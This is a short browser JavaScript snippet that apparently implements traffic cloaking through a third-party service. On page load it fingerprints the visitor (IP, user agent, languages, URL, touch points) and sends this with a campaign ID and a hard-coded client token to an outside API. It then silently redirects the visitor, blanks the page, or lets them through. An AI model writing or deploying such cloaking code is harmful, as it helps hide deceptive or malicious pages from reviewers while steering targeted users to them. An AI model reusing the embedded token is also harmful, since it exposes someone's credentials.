async function checkTraffic() {
    try {
        let clientIP = '';
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            clientIP = ipData.ip || '';
        } catch (ipError) {
            console.warn('Could not get client IP:', ipError);
        }

        let metaTag = document.querySelector('meta[name="referrer"]');
        if (!metaTag) {
            metaTag = document.createElement('meta');
            metaTag.name = 'referrer';
            document.head.appendChild(metaTag);
        }
        metaTag.content = 'origin';

        const params = {
            campaign_id: '747',
            client_token: '731378330:WqbvjkAtl7xVxGaZoYzjieMw4pNiFor1J8U33ulYyhpb24fusT2PXMymrH8FnOvU',
            ip: clientIP,
            user_agent: navigator.userAgent,
            accept_language: navigator.languages ? navigator.languages.join(',') : navigator.language,
            current_url: window.location.href,
            max_touch_points: String(navigator.maxTouchPoints || 0),
        };

        const response = await fetch('https://api.cloakerly.com/v8/?' + new URLSearchParams(params).toString());
        const data = await response.text();

        console.log("API Response:", data);
        console.log("Current URL:", window.location.href);

        if (data.startsWith('http')) {
            console.log("Redirecting to:", data);
            window.location.href = data;
        } else if (data === 'true') {
            console.log('Traffic allowed');
        } else {
            window.location.href = 'about:blank';
        }
    } catch (error) {
        console.error('Cloakerly API error:', error);
    }
}

checkTraffic();